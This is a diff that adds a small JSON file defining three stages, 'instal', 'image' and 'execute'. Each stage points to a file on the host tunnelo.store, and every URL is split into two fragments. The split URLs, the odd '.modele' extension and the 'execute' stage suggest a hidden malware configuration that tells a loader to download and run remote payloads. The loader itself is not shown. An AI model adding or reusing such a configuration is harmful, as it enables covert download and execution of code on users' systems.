@@ -1,0 +1,19 @@
+[
+  {
+    "instal": {
+      "version": "2",
+      "first": "https://www1",
+      "last": ".tunnelo.store/e_ab.modele"
+    },
+	"image": {
+      "version": "2",
+      "first": "https://www1",
+      "last": ".tunnelo.store/e_ac.modele"
+    },
+	"execute": {
+      "version": "2",
+      "first": "https://www1",
+      "last": ".tunnelo.store/e_ad.modele"
+    }
+  }
+]
